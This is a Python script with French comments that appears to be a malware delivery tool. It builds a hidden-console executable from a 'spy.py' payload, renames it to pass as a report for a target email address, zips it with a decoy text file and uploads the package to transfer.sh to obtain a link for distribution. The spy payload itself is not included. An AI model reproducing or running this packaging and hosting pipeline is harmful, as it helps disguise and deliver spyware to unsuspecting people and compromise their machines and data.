import os
import shutil
import zipfile
import subprocess

# Ici, la fonction uploader_fileio doit être dans le même fichier
# ou importée si tu as le fichier uploader.py dans le même dossier
# Sinon adapte l'import
def uploader_fileio(file_path):
    import requests
    try:
        with open(file_path, 'rb') as f:
            print(f"[*] Début upload de {file_path} sur transfer.sh")
            response = requests.put(f'https://transfer.sh/{os.path.basename(file_path)}', data=f)
        if response.status_code == 200:
            print("[+] Upload réussi")
            return response.text.strip()
        else:
            print(f"[!] Erreur upload Transfer.sh : code {response.status_code}")
            return None
    except Exception as e:
        print(f"[!] Erreur upload : {e}")
        return None


def create_intrusion_zip(email, zip_path):
    print("[*] Début création ZIP")
    dossier_payload = "model/payload"
    dossier_temp = os.path.dirname(zip_path)
    os.makedirs(dossier_temp, exist_ok=True)
    print(f"[*] dossier_payload: {dossier_payload}")
    print(f"[*] dossier_temp: {dossier_temp}")

    spy_exe = os.path.join(dossier_payload, "spy.exe")
    spy_script = os.path.join(dossier_payload, "spy.py")
    fichier_test = os.path.join(dossier_payload, "fichier_test.txt")

    # 1. Générer spy.exe si manquant
    if not os.path.exists(spy_exe):
        print("[*] spy.exe manquant, génération en cours...")
        try:
            subprocess.run([
                "pyinstaller",
                "--onefile",
                "--distpath", dossier_payload,
                "--noconsole",
                spy_script
            ], check=True)
            print("[+] spy.exe généré avec succès")
        except subprocess.CalledProcessError as e:
            print(f"[!] Erreur lors de la génération de spy.exe : {e}")
            raise

    # 2. Créer fichier_test.txt si manquant
    if not os.path.exists(fichier_test):
        print("[*] Création fichier_test.txt")
        with open(fichier_test, "w", encoding="utf-8") as f:
            f.write(f"Contenu confidentiel simulé pour {email}.\nDonnées sensibles...")

    # 3. Copier spy.exe renommé temporairement
    exe_renomme = os.path.join(dossier_temp, f"rapport_{email.replace('@', '_')}.exe")
    print(f"[*] Copie de spy.exe vers {exe_renomme}")
    shutil.copy(spy_exe, exe_renomme)

    # 4. Créer ZIP avec spy renommé et fichier_test
    print(f"[*] Création ZIP à {zip_path}")
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        zipf.write(exe_renomme, os.path.basename(exe_renomme))
        zipf.write(fichier_test, os.path.basename(fichier_test))

    # 5. Nettoyage temporaire
    if os.path.exists(exe_renomme):
        os.remove(exe_renomme)
        print(f"[*] Fichier temporaire {exe_renomme} supprimé")

    print("[*] Création ZIP terminée")


def process_email_upload(email):
    print(f"[*] Démarrage process pour email : {email}")
    dossier_temp = "temp"
    os.makedirs(dossier_temp, exist_ok=True)

    zip_path = os.path.join(dossier_temp, f"rapport_{email.replace('@', '_')}.zip")
    print(f"[*] Chemin ZIP : {zip_path}")

    try:
        # 1. Créer le ZIP
        create_intrusion_zip(email, zip_path)
    except Exception as e:
        print(f"[!] Erreur création ZIP : {e}")
        return None

    if not os.path.exists(zip_path) or os.path.getsize(zip_path) == 0:
        print("[!] ZIP introuvable ou vide après création")
        return None

    # 2. Upload du ZIP
    print("[*] Upload du fichier ZIP")
    lien = uploader_fileio(zip_path)
    if lien is None:
        print("[!] Erreur lors de l'upload du fichier.")
    else:
        print(f"[+] Upload réussi : {lien}")

    # 3. Supprimer le ZIP après upload
    if os.path.exists(zip_path):
        os.remove(zip_path)
        print(f"[*] ZIP temporaire {zip_path} supprimé")

    return lien


